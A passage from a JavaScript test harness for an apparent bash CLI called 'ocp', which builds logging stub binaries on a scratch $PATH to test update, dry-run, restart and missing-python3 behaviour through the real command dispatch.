//                        FAKE-CMD-RESTART-CALLED stub, as before. Set false to let the REAL,
//                        sliced cmd_restart run — the only way to exercise this issue's fix.
//   resolveRestartExit/Stdout/Stderr   controls the fake `node`'s new
//                        `scripts/upgrade.mjs --resolve-restart` case (Stdout/Stderr are arrays
//                        of lines; Stdout lines are what the REAL mode prints on success — the
//                        resolved restart command(s), one per `console.log` call).
//   serviceStubsSucceed  default false (unchanged posture: launchctl/systemctl/pkill/nohup/
//                        openclaw log-and-loudly-refuse, exit 95, per AGENTS.md "unreachable by
//                        construction"). Set true only to observe a resolved restart command
//                        actually being invoked (it still never reaches a real service — this
//                        is still the from-scratch scratch $PATH).
//   curlHealthExit       controls the new `curl` stub's exit for a "*/health*" URL (default 1,
//                        i.e. "not responding" — deterministic and avoids needing to fabricate
//                        a `/usage`-shaped JSON body for cmd_usage's own picky parser, which is
//                        unrelated to this issue). Any curl call NOT matching "*/health*" (e.g.
//                        cmd_usage's own `/usage` call, reached only on a successful health
//                        check) refuses loudly (exit 94) rather than silently doing something
//                        undefined — none of this issue's tests reach that far on purpose.
function _bwHarnessRun({
  args = [], kind = "noop", checks = [], pythonAbsent = false, pythonPackageJsonFails = false,
  gitPullExit = 0, gitPullOutput = "Already up to date.", postFlightExit = 0,
  overrideCmdRestart = true,
  resolveRestartExit = 0, resolveRestartStdout = [], resolveRestartStderr = [],
  serviceStubsSucceed = false, curlHealthExit = 1,
  // Issue #263: simulates "openclaw is not on $PATH at all" — the same always-127-exit shadow
  // stub technique `pythonAbsent`/`curlAbsent` already use, rather than simply omitting the
  // `bin/openclaw` file. (Unlike curl, openclaw is not normally under /usr/bin or /bin on this
  // repo's own dev hosts — it is a homebrew/npm-global install — so omission alone happens to
  // work here today, but the shadow-stub technique is used anyway for the same reason #261
  // adopted it for curl: it does not depend on what happens to be missing from a given host's
  // /usr/bin:/bin, which is real system directory this harness's $PATH always includes for
  // python3/cat/sed/mktemp. Independent of serviceStubsSucceed: "not found on $PATH" is a third
  // state, not a variant of "installed and succeeds/fails".
  openclawAbsent = false,
  // Independent review round 1 (case 6, blocking): lets the "installed and fails" branch of the
  // openclaw stub report an ARBITRARY exit code and output, instead of always the fixed
  // exit-95/refusal-text default. Needed to reproduce a genuinely-installed, genuinely-failing
  // openclaw whose own diagnostic output happens to contain the substring "command not found"
  // (a real subcommand-dispatcher failure mode, e.g. a plugin/dependency lookup message) without
  // that text ever implying "not found on $PATH". `undefined` (the default) leaves the existing
  // fixed refusal behavior byte-identical to before this option existed.
  openclawFailExit = undefined,
  openclawFailOutput = undefined,
  // Issue #242: generic curl response fixtures for the nine read-only display commands
  // (usage/logs/models/sessions/clear/keys/settings), none of which existed as a harness
  // capability before this issue (every prior call site here only ever needed the `/health`
  // arm). Each entry is `{ match, body, exit }`: `match` is matched as a `case "$*" in
  // *"<match>"*)` substring against curl's full argv (so it discriminates by URL/path, same
  // technique the pre-existing `/health` arm already uses), `body` is written to its own
  // fixture file and `cat`, `exit` defaults to 0. Checked BEFORE the `/health` arm and the
  // default refusal, in the order given — callers needing more than one endpoint per test
  // should list the more specific match first (e.g. "/api/usage" before "/usage", since the
  // latter is a substring of the former). Purely additive: an empty array (the default)
  // leaves every existing call site's curl stub byte-identical to before this issue.
  curlResponses = [],
  // Issue #242 test-setup note (NOT a fix for a #242/#241 defect — a separate, pre-existing,
  // previously-undiscovered one, found incidentally while adding these tests, out of scope for
  // both PRs and left for its own issue): `_curl()`'s `curl "${_AUTH_ARGS[@]}" "$@"` references
  // an EMPTY bash array under `set -u`. GNU bash 3.2.57 (macOS's default `/bin/bash` — the last
  // GPLv2 release, which is what `execFileSync("bash", ...)` resolves to here, verified via
  // `bash --version`) raises "unbound variable" for `"${arr[@]}"` when `arr` has zero elements,
  // even though POSIX/bash>=4.4 treat that as expanding to nothing. Reproduced directly against
  // the unmodified `ocp` functions slice with `OCP_ADMIN_KEY` unset and no `~/.ocp/admin-key`
  // file (the harness's own default state below) — `_curl` dies before ever reaching the
  // network call. Every _curl-based test in this file sets a non-empty `adminKey` to route
  // around this ORTHOGONAL defect (a non-empty `_AUTH_ARGS` array never hits the empty-array
  // path) rather than accidentally depending on it. (This defect is fixed upstream as of #258 —
  // this workaround is now belt-and-braces, not load-bearing — but every call site keeps it
  // rather than depending on the fix to stay in place.)
  adminKey = "",
  // MEDIUM-3 (independent review round 1 on #241): this harness's package.json was always
  // STATIC ("3.26.0"), so `old_ver === new_ver` in every pre-existing test, and a mutation
  // swapping `"v$new_ver"` for the stale `"v$old_ver"` in the real --post-flight-only call site
  // was UNDETECTABLE — the money test named after "the version the tree actually landed on"
  // could not tell a fresh value from a stale one, because they were always identical. Set true
  // to make the fake `git pull` stub, on a SUCCESSFUL "pull origin main --ff-only", overwrite
  // the harness's package.json with version "3.27.0" (a real, observable bump from the initial
  // "3.26.0") — combine with `postFlightExpectedTarget` below to make a stale-vs-fresh mutation
  // actually distinguishable.
  simulateGitPullVersionBump = false,
  // MEDIUM-3: when set, the fake `node`'s `--post-flight-only` case becomes VERSION-AWARE: it
  // only honors `postFlightExit` when the invocation's target argument matches this string
  // exactly (mirroring the real predicate's "wrong version -> fail" behavior); any other target
  // (e.g. the STALE pre-pull version, under a mutation using `$old_ver` instead of `$new_ver`)
  // is treated as a mismatch and fails with a distinct exit code. `undefined` (the default)
  // preserves every existing test's behavior exactly: `postFlightExit` applies unconditionally,
  // regardless of the target argument.
  postFlightExpectedTarget = undefined,
  // LOW-4: when true (and overrideCmdRestart stays at its default true), the STUB cmd_restart's
  // final line becomes `exit 0` instead of `return 0`, directly reproducing the shape the outer
  // `( cmd_restart ) || restart_status=$?` subshell in _cmd_update_light exists to contain.
  cmdRestartStubExits = false,
} = {}) {
  const root = _ltMkdtemp(join(_ltTmp(), "ocp-bash-harness-"));
  try {
    const home = join(root, "home");
    const bin = join(root, "bin");
    tMkdirSync(home, { recursive: true });
    tMkdirSync(bin, { recursive: true });

    testWriteFile(join(root, "package.json"), JSON.stringify({ version: "3.26.0" }));
    const logPath = join(root, "log.txt");
    testWriteFile(logPath, "");
    const doctorJsonPath = join(root, "doctor.json");
    testWriteFile(doctorJsonPath, JSON.stringify({
      current_version: "v3.26.0", latest_version: "v3.26.0", next_action: { kind }, checks,
    }));

    const mkStub = (name, body) => {
      const p = join(bin, name);
      testWriteFile(p, `#!/usr/bin/env bash\n${body}\n`);
      _ltChmod(p, 0o755);
    };

    // Recognizes exactly the two `node` invocations these two bugs' code paths can reach
    // (doctor.mjs --json for the kind decision, upgrade.mjs --post-flight-only for
    // _cmd_update_restart's verification step) and refuses anything else LOUDLY — including
    // the `upgrade|fresh_install)` exec arm and `--rollback`, which this suite never exercises
    // on purpose (see the exec-hazard note above the harness).
    mkStub("node", [
      `echo "FAKE-NODE-CALL $*" >> "${logPath}"`,
      `case "$*" in`,
      `  *"scripts/doctor.mjs --json"*)`,
      `    cat "${doctorJsonPath}"`,
      `    exit 0`,
      `    ;;`,
      `  *"scripts/upgrade.mjs --post-flight-only"*)`,
      ...(postFlightExpectedTarget === undefined ? [
        `    exit ${postFlightExit}`,
      ] : [
        // MEDIUM-3: version-aware -- only the EXPECTED (post-pull) target succeeds; anything
        // else, including a STALE pre-pull version reached via a mutation, is a mismatch.
        `    case "$*" in`,
        `      *${JSON.stringify(postFlightExpectedTarget)}*)`,
        `        exit ${postFlightExit}`,
        `        ;;`,
        `      *)`,
        `        echo "FAKE-NODE: post-flight target mismatch -- expected ${postFlightExpectedTarget}, got: $*" >&2`,
        `        exit 98`,
        `        ;;`,
        `    esac`,
      ]),
      `    ;;`,
      // Issue #224: the new one-shot resolver mode `cmd_restart` shells out to instead of
      // reimplementing cgroup/ss parsing a second time in bash — see scripts/upgrade.mjs's
      // `--resolve-restart` CLI entrypoint. Real behavior mirrored exactly: resolved command(s)
      // on stdout (one per line) + exit 0 on success, refusal text on stderr + nonzero exit on
      // failure — never both, never neither.
      `  *"scripts/upgrade.mjs --resolve-restart"*)`,
      ...resolveRestartStderr.map((l) => `    echo ${JSON.stringify(l)} >&2`),
      ...resolveRestartStdout.map((l) => `    echo ${JSON.stringify(l)}`),
      `    exit ${resolveRestartExit}`,
      `    ;;`,
      `  *)`,
      `    echo "FAKE-NODE: refusing unhandled invocation (would run a REAL doctor.mjs/` +
        `upgrade.mjs path -- see #225 exec hazard): $*" >&2`,
      `    exit 97`,
      `    ;;`,
      `esac`,
    ].join("\n"));

    mkStub("git", [
      `echo "FAKE-GIT-CALL $*" >> "${logPath}"`,
      `case "$*" in`,
      `  "pull origin main --ff-only")`,
      // MEDIUM-3: simulates a REAL version bump landing on disk, so old_ver != new_ver becomes
      // observable — every pre-existing test leaves this false and keeps package.json static.
      ...(simulateGitPullVersionBump ? [
        `    printf '%s' ${JSON.stringify(JSON.stringify({ version: "3.27.0" }))} > ${JSON.stringify(join(root, "package.json"))}`,
      ] : []),
      `    echo ${JSON.stringify(gitPullOutput)}`,
      `    exit ${gitPullExit}`,
      `    ;;`,
      `  *)`,
      `    echo "FAKE-GIT: unhandled invocation: $*" >&2`,
      `    exit 96`,
      `    ;;`,
      `esac`,
    ].join("\n"));

    // Defense in depth (AGENTS.md: "any command that can mutate a running service ... should
    // be a stub that fails loudly by default") — unreachable from the pre-#224 tests below
    // (which all override `cmd_restart` wholesale, see the driver below), but must never
    // silently succeed if a future test forgets to. Issue #224's own tests need to observe a
    // resolved restart command actually being run (still only ever against this harness's own
    // fake binaries — serviceStubsSucceed never reaches a real service either), so they opt in
    // via serviceStubsSucceed; every other call site keeps the strict refuse-and-log default.
    for (const name of ["launchctl", "systemctl", "pkill", "nohup"]) {
      mkStub(name, serviceStubsSucceed ? [
        `echo "FAKE-${name.toUpperCase()}-CALL $*" >> "${logPath}"`,
        `exit 0`,
      ].join("\n") : [
        `echo "FAKE-${name.toUpperCase()}-CALL $*" >> "${logPath}"`,
        `echo "FAKE-${name.toUpperCase()}: refusing -- this harness must never reach a real ` +
          `service-mutating command (AGENTS.md 'unreachable by construction')" >&2`,
        `exit 95`,
      ].join("\n"));
    }

    // Issue #263: `openclaw` gets its own three-state stub (not the shared loop above) because
    // `cmd_restart gateway`'s fix needs to distinguish THREE situations, not two: not found on
    // $PATH (openclawAbsent — a normal, silent-or-informational configuration, see #263's own
    // scope discussion), installed and succeeds (serviceStubsSucceed), and installed and fails
    // (the default — same "refuse loudly, AGENTS.md 'unreachable by construction'" posture the
    // shared loop already uses for launchctl/systemctl/pkill/nohup, preserved byte-identically
    // when openclawAbsent is false and openclawFailExit/openclawFailOutput are both undefined,
    // all three defaults). openclawFailExit/openclawFailOutput (independent review round 1,
    // case 6) let the installed-and-fails branch report an arbitrary exit code and combined
    // output, so a failure whose OWN text happens to contain "command not found" can be
    // reproduced without that ever meaning "not found on $PATH".
    mkStub("openclaw", openclawAbsent ? [
      `echo "FAKE-OPENCLAW-ABSENT-CALL $*" >> "${logPath}"`,
      `exit 127`,
    ].join("\n") : serviceStubsSucceed ? [
      `echo "FAKE-OPENCLAW-CALL $*" >> "${logPath}"`,
      `echo "FAKE-OPENCLAW: gateway restarted"`,
      `exit 0`,
    ].join("\n") : [
      `echo "FAKE-OPENCLAW-CALL $*" >> "${logPath}"`,
      ...(openclawFailOutput !== undefined
        ? [`echo ${JSON.stringify(openclawFailOutput)} >&2`]
        : [`echo "FAKE-OPENCLAW: refusing -- this harness must never reach a real ` +
             `service-mutating command (AGENTS.md 'unreachable by construction')" >&2`]),
      `exit ${openclawFailExit ?? 95}`,
    ].join("\n"));

    // Issue #224: `sleep` is a no-op stub purely for test speed (the real `cmd_restart` calls
    // `sleep 3` after a successful restart command, before its own health check) — never a
    // hazard, so always stubbed regardless of overrideCmdRestart (the pre-#224 tests never
    // reach the real cmd_restart body at all, so this has no effect on them).
    mkStub("sleep", [
      `echo "FAKE-SLEEP-CALL $*" >> "${logPath}"`,
      `exit 0`,
    ].join("\n"));

    // Issue #224: `curl` is real (unstubbed) on every pre-#224 call site above — none of them
    // reach it, since they all override `cmd_restart` wholesale. The real `cmd_restart` DOES
    // call curl (health check, and — on the success path — `cmd_usage`'s own `/usage` call), so
    // it needs a deterministic stub the moment overrideCmdRestart:false is used. Only "*/health*"
    // is recognized (controlled by curlHealthExit); anything else refuses loudly (exit 94)
    // rather than silently doing something undefined — this issue's own tests never need
    // cmd_usage's `/usage` call to succeed, so it's deliberately left unhandled here.
    //
    // Issue #242: curlResponses (see its own doc comment above) adds arbitrary fixture arms,
    // checked BEFORE "/health" and the default refusal, for the nine display commands' own
    // curl calls (/api/usage, /usage, /logs, /v1/models, /sessions, /api/keys, /settings).
    const curlResponseFiles = curlResponses.map((r, i) => {
      const p = join(root, `curl-resp-${i}.json`);
      testWriteFile(p, r.body ?? "");
      return { match: r.match, exit: r.exit ?? 0, path: p };
    });
    mkStub("curl", [
      `echo "FAKE-CURL-CALL $*" >> "${logPath}"`,
      `case "$*" in`,
      ...curlResponseFiles.flatMap((r) => [
        `  *${JSON.stringify(r.match)}*)`,
        `    cat ${JSON.stringify(r.path)}`,
        `    exit ${r.exit}`,
        `    ;;`,
      ]),
      `  *"/health"*)`,
      `    exit ${curlHealthExit}`,
      `    ;;`,
      `  *)`,
      `    echo "FAKE-CURL: refusing unhandled invocation: $*" >&2`,
      `    exit 94`,
      `    ;;`,
      `esac`,
    ].join("\n"));

    // Simulates issue #236's exact repro ("stubbed absent": a real executable file that always
    // reports command-not-found's own exit code) rather than trying to strip PATH of every
    // directory that might contain a real python3 — the issue's own reviewer used the identical
    // technique. Omitted entirely (not merely present-but-broken) when pythonAbsent is false, so
    // the real /usr/bin/python3 answers instead (present on both this repo's macOS dev hosts and
    // its Linux CI runners).
    if (pythonAbsent) {
      mkStub("python3", [
        `echo "FAKE-PYTHON3-ABSENT-CALL $*" >> "${logPath}"`,
        `exit 127`,
      ].join("\n"));
    } else if (pythonPackageJsonFails) {
      // MEDIUM-1 (independent review round 1 on #241): `pythonAbsent` fails EVERY python3
      // invocation, including `cmd_update`'s own doctor-kind extraction a few lines before
      // `_cmd_update_light` is ever reached — under a fully-absent python3, `kind` itself
      // degrades to "unknown" and the dispatch never enters the light path at all (see the
      // sibling #236 test above), so `pythonAbsent` cannot exercise "kind extraction succeeded,
      // but the LATER package.json version read specifically fails" — the exact shape MEDIUM-1's
      // finding needs (a python3 that is present and working in general, but broken/flaky for
      // one specific call, or simply hits a transient failure reading a real package.json at
      // that moment). This selective stub delegates to the REAL /usr/bin/python3 (absolute path,
      // not a bare `python3` call, which would resolve back to this same stub file first on the
      // scratch $PATH and recurse) for every invocation EXCEPT the `import json;
      // ...package.json...` version-read shape, which fails outright — reproducing "new_ver
      // becomes '?'" without touching the unrelated kind-extraction call.
      mkStub("python3", [
        `case "$*" in`,
        `  *"package.json"*)`,
        `    echo "FAKE-PYTHON3-PACKAGEJSON-FAIL-CALL $*" >> "${logPath}"`,
        `    exit 1`,
        `    ;;`,
        `  *)`,
        `    exec /usr/bin/python3 "$@"`,
        `    ;;`,
        `esac`,
      ].join("\n"));
    }

    // `cmd_restart` override goes AFTER the sliced source in the SAME generated file — never
    // before (the #217 incident this harness exists to never repeat). Bash resolves whichever
    // definition of a function name is executed LAST, so plain top-to-bottom ordering in one
    // file gives the same guarantee as "define the stub after `source`" without an actual
    // `source` call.
    //
    // Independent-review finding (MEDIUM-1): an earlier revision of this harness ran ONLY the
    // sliced function-definitions region and then called `cmd_update "$@"` directly, which
    // never executes ocp's own OUTER dispatch (the `case "$subcmd" in ... update) cmd_update
    // "$@" ;; ...` block after `# ── dispatch`). Dropping "$@" at THAT outer arm fully
    // reintroduces #235's bug class yet left the suite green under the direct-call design,
    // because that design skipped the exact wiring layer #225 asks this harness to cover.
    // Fixed by appending the REAL, unmodified dispatch section after the override and driving
    // it via its own argv, so the outer dispatch runs for real too.
    //
    // Issue #224: overrideCmdRestart:false skips this stub entirely, so the REAL cmd_restart
    // from the sliced source (_bwFnSrc, above) is what the dispatch below actually calls — the
    // only way to exercise this issue's fix. Still safe by construction: nothing here changes
    // the ordering guarantee (no override is defined at all, so there's nothing to shadow), and
    // every command the real cmd_restart can reach (node/systemctl/launchctl/pkill/nohup/sleep/
    // curl) is one of this harness's own scratch-$PATH stubs, never a real binary.
    const driver = [
      _bwFnSrc,
      "",
      overrideCmdRestart ? [
        `cmd_restart() {`,
        `  echo "FAKE-CMD-RESTART-CALLED $*" >> "${logPath}"`,
        `  echo "Restarting proxy..."`,
        `  echo "✓ Proxy restarted successfully."`,
        // LOW-4 (independent review round 1): the pre-existing #224 test that drives the REAL
        // cmd_restart uses `resolveRestartExit: 1`, which makes it `return` (not `exit`) --
        // that path never needed the outer `( cmd_restart ) || restart_status=$?` subshell in
        // _cmd_update_light, since `return` behaves correctly with or without it. Nothing
        // exercised the ACTUAL hazard the subshell exists for: a `cmd_restart` whose SUCCESS
        // path calls `exit` (cmd_usage's own pre-existing `/usage`-probe hazard, MEDIUM-2 above)
        // terminates the entire process immediately if not contained, silently skipping
        // everything after it -- "Verifying restart...", the post-flight call, all of it -- with
        // no error, just a premature clean-looking exit. `cmdRestartStubExits` reproduces that
        // shape directly against THIS stub (independent of whatever cmd_restart's real
        // implementation happens to do after MEDIUM-2's fix), so the outer subshell's own
        // structural correctness in _cmd_update_light is what's under test, not cmd_restart's
        // internals.
        cmdRestartStubExits ? `  exit 0` : `  return 0`,
        `}`,
      ].join("\n") : "# issue #224: overrideCmdRestart=false -- the REAL cmd_restart above is used as-is",
      "",
      `PROXY="http://127.0.0.1:1"`,
      "",
      _bwFullSrc.slice(_bwDispatchIdx > -1 ? _bwDispatchIdx : _bwFullSrc.length),
      "",
    ].join("\n");
    const driverPath = join(root, "driver.sh");
    testWriteFile(driverPath, driver);

    const env = {
      HOME: home,
      // From-scratch $PATH, never the calling shell's: our stubs first, then just enough of
      // the real system to resolve bash builtins' external helpers (cat/sed/python3 when
      // pythonAbsent is false) and nothing that could contain a second, real node/git.
      PATH: `${bin}:/usr/bin:/bin`,
      OCP_TEST_LOG: logPath,
      OCP_ADMIN_KEY: adminKey,
    };

    // `args[0]` is now the top-level SUBCOMMAND, since the real dispatch runs for real (see the
    // driver-assembly comment above) — callers below pass `["update", ...flags]`, matching a
    // real `ocp update ...` invocation's argv shape.
    //
    // Issue #242 fix: `execFileSync` (used here originally) only returns stdout — on a ZERO
    // exit status it discards stderr entirely (only the `catch` branch's `e.stderr` ever
    // captured it, i.e. only on a NONZERO exit). Every pre-#242 test here happened to only
    // assert on stderr in a nonzero-exit (refusal) scenario, so this never surfaced. #242's own
    // display-command tests need stderr on a successful (status 0) run too — e.g. proving a
    // degraded-but-still-status-0 case truly carries no warning. `spawnSync` always returns
    // `{stdout, stderr, status}` regardless of exit code, so switching to it removes the gap
    // for every caller, not just #242's. (#241/PR #255's own MEDIUM-1/LOW-6 tests independently
    // needed this exact same fix — e.g. the --target warning firing on a successful, status-0
    // run — and originally ported a duplicate of it before this rebase; this is now the single
    // shared fix both PRs rely on.)
    const _bwRes = spawnSync("bash", [driverPath, ...args], { cwd: root, env, encoding: "utf8" });
    const stdout = _bwRes.stdout ?? "";
    const stderr = _bwRes.stderr ?? "";
    const status = typeof _bwRes.status === "number" ? _bwRes.status : 1;
    const log = testExistsSync(logPath) ? _ltRead(logPath, "utf8").split("\n").filter(Boolean) : [];
    return { stdout, stderr, status, log };
  } finally {
    _ltRm(root, { recursive: true, force: true });
  }
}

function _bwCalled(log, prefix) {
  return log.some((l) => l.startsWith(prefix));
}

// ── #235: `ocp update --dry-run` must not mutate on the patch-bump ("update" kind) path ──────
// args[0]="update" drives this through ocp's REAL top-level dispatch (`case "$subcmd" in ...
// update) cmd_update "$@" ;;`), not a direct call to cmd_update — see the driver-assembly
// comment in _bwHarnessRun for why that distinction is load-bearing (MEDIUM-1 finding).
test("#235: cmd_update kind=update --dry-run does NOT pull or restart (the money test)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--dry-run"] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `git must NOT run under --dry-run; log=${JSON.stringify(r.log)}`);
  assert.ok(!_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must NOT run under --dry-run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("[dry-run]"), `expected a [dry-run] preview line in stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#235: cmd_update kind=update --dry-run still honors dry-run when --dry-run is NOT the first flag ('\"$@\"', not just $1)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--yes", "--dry-run"] });
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `git must NOT run; log=${JSON.stringify(r.log)}`);
  assert.ok(!_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must NOT run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("[dry-run]"), `expected a [dry-run] line, got: ${JSON.stringify(r.stdout)}`);
});

test("#235 control: cmd_update kind=update with NO --dry-run DOES pull and restart (proves the money test above can fail)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update"] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(_bwCalled(r.log, "FAKE-GIT-CALL pull origin main --ff-only"), `git pull must run; log=${JSON.stringify(r.log)}`);
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must run; log=${JSON.stringify(r.log)}`);
  assert.ok(!r.stdout.includes("[dry-run]"), `must NOT print a dry-run preview when actually mutating, got: ${JSON.stringify(r.stdout)}`);
});

test("#235 acceptance (independent-review MEDIUM-1): this money test runs through ocp's REAL outer dispatch, not a direct cmd_update call", () => {
  // A mutation dropping "$@" at the OUTER `update) cmd_update "$@" ;;` arm (as opposed to the
  // inner kind-dispatch arm #235 itself fixed) fully reintroduces the bug's observable
  // behavior — git+restart fire under --dry-run because no flags ever reach cmd_update at all.
  // Demonstrated by hand (file-backup mutation, restored + shasum-verified) in the PR
  // description; this test is the automated guard that mutation is caught by, since it drives
  // the real dispatch end to end rather than skipping straight to the inner function.
  const r = _bwHarnessRun({ kind: "update", args: ["update", "--dry-run"] });
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL") && !_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"),
    `--dry-run must survive ocp's real outer dispatch and prevent mutation; log=${JSON.stringify(r.log)}`);
});

// ── Sibling non-regression: the "restart" kind's pre-existing --dry-run guard (PR #217) ──────
test("non-regression: cmd_update kind=restart --dry-run still does not restart (pre-existing #217 guard, unaffected by #235's fix)", () => {
  const r = _bwHarnessRun({ kind: "restart", args: ["update", "--dry-run"] });
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `git must NOT run; log=${JSON.stringify(r.log)}`);
  assert.ok(!_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must NOT run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("[dry-run]"), `expected a [dry-run] line, got: ${JSON.stringify(r.stdout)}`);
});

test("non-regression control: cmd_update kind=restart with NO --dry-run DOES restart + post-flight verify", () => {
  const r = _bwHarnessRun({ kind: "restart", args: ["update"] });
  assert.ok(!_bwCalled(r.log, "FAKE-GIT-CALL"), `restart kind must never touch git; log=${JSON.stringify(r.log)}`);
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must run; log=${JSON.stringify(r.log)}`);
  assert.ok(_bwCalled(r.log, "FAKE-NODE-CALL") && r.log.some((l) => l.includes("post-flight-only")),
    `post-flight verification must run; log=${JSON.stringify(r.log)}`);
});

// ── #236: the WARN/INFO block must not kill cmd_update when python3 is absent ────────────────
test("#236: cmd_update survives an absent python3 — no silent 127 death before the kind dispatch even runs", () => {
  const r = _bwHarnessRun({ kind: "noop", args: ["update"], pythonAbsent: true });
  // Before the fix: bash's own command-not-found for the WARN/INFO block's python3 is exit 127,
  // with NOTHING printed yet (the case "$kind" in dispatch below it — the ONLY place this
  // function prints anything at that point — never runs). That exact signature is the
  // regression to detect; asserting its NEGATION is the actual behavioral check (not merely
  // "did not throw").
  assert.ok(
    !(r.status === 127 && r.stdout === ""),
    `cmd_update died silently (status=127, empty stdout) — the #236 regression is back. ` +
    `stderr=${JSON.stringify(r.stderr)} log=${JSON.stringify(r.log)}`,
  );
  assert.ok(r.stdout.length > 0, `expected SOME output even in degraded mode, got empty stdout (log=${JSON.stringify(r.log)})`);
});

test("#236 control: cmd_update with python3 PRESENT reaches the kind dispatch and prints WARN/INFO lines", () => {
  const r = _bwHarnessRun({
    kind: "noop",
    args: ["update"],
    checks: [{ level: "WARN", message: "control-warn-marker" }, { level: "INFO", message: "control-info-marker" }],
  });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("control-warn-marker"), `expected the WARN line surfaced, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("control-info-marker"), `expected the INFO line surfaced, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("Already at latest"), `expected the noop-kind message, got: ${JSON.stringify(r.stdout)}`);
});

// ═════════════════════════════════════════════════════════════════════════════
// Issue #242 (audit follow-up to #236): nine MORE `<curl-or-var> | python3 -c "..."` call sites
// across the read-only display commands (usage/logs/models/sessions/clear/keys/settings) have
// the identical shape #236 fixed exactly once for cmd_update's own doctor-json formatter — a
// bare pipeline, not inside an if/while, that `set -euo pipefail` (ocp:7) kills SILENTLY the
// instant python3 exits non-zero, whether because python3 is missing (exit 127) or because the
// formatter itself chokes on the response body (malformed JSON). Fixed via one shared helper,
// `_pyfail` (defined near the top of `ocp`, alongside `_json`/`_bar`), rather than nine
// independent inline fallbacks: it prints an unmistakable warning AND echoes the raw
// (unformatted) response so no information is lost in degraded mode — load-bearing for
// `cmd_keys add` in particular, the only place a newly created key is ever shown.
//
// Each site below gets two tests: the MONEY test (pythonAbsent:true — must NOT reproduce #236's
// signature of silent death, and must show the raw data, not a blank screen) and a CONTROL test
// (real python3 — the formatted, happy-path output must be byte-for-byte unaffected by this
// fix). Two representative sites (cmd_clear, cmd_keys add — chosen because one is the
// "underlying mutation already happened, only reporting fails" case and the other is the
// highest-stakes "only view of a value" case) also get a THIRD test proving the fallback also
// catches a REAL (non-stubbed) python3 crashing on malformed JSON, not merely "python3 missing"
// — this is real /usr/bin/python3 on this harness's scratch $PATH, not a fake stub, genuinely
// exercising `json.loads` raising a `JSONDecodeError`.
console.log("\nocp display commands survive an absent/broken python3 formatter (#242):");

test("#242 cmd_usage --by-key: absent python3 shows the raw usage-by-key JSON instead of dying silently", () => {
  const r = _bwHarnessRun({
    args: ["usage", "--by-key"], pythonAbsent: true, adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/usage", body: JSON.stringify({ byKey: [{ key_name: "laptop-marker", requests: 10, successes: 9, errors: 1, avg_elapsed_ms: 2500, last_request: "2026-08-01T00:00:00Z" }] }) }],
  });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("laptop-marker"), `expected the raw byKey JSON (still containing the real data) on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_usage --by-key with python3 PRESENT still prints the formatted table (unaffected by the fix)", () => {
  const r = _bwHarnessRun({
    args: ["usage", "--by-key"], adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/usage", body: JSON.stringify({ byKey: [{ key_name: "laptop-marker", requests: 10, successes: 9, errors: 1, avg_elapsed_ms: 2500, last_request: "2026-08-01T00:00:00Z" }] }) }],
  });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("Usage by Key"), `expected the formatted header, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("laptop-marker"), `expected the formatted row, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(!r.stderr.includes("python3 is unavailable"), `must not print the degraded-mode warning on the happy path; stderr=${JSON.stringify(r.stderr)}`);
});

test("#242 cmd_usage (main): absent python3 shows the raw plan JSON instead of dying silently", () => {
  const body = JSON.stringify({
    plan: {
      currentSession: { percent: "12%", resetsIn: "3h", resetsAtHuman: "3:00 PM" },
      weeklyLimits: { allModels: { percent: "40%", resetsIn: "2d", resetsAtHuman: "Mon 9:00 AM" } },
      extraUsage: { status: "allowed" },
    },
    proxy: { uptime: "5h", totalRequests: 42, activeRequests: 0, errors: 0, timeouts: 0 },
    models: {},
  });
  const r = _bwHarnessRun({ args: ["usage"], pythonAbsent: true, curlResponses: [{ match: "/usage", body }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("allowed"), `expected the raw plan JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_usage (main) with python3 PRESENT still prints the formatted panel", () => {
  const body = JSON.stringify({
    plan: {
      currentSession: { percent: "12%", resetsIn: "3h", resetsAtHuman: "3:00 PM" },
      weeklyLimits: { allModels: { percent: "40%", resetsIn: "2d", resetsAtHuman: "Mon 9:00 AM" } },
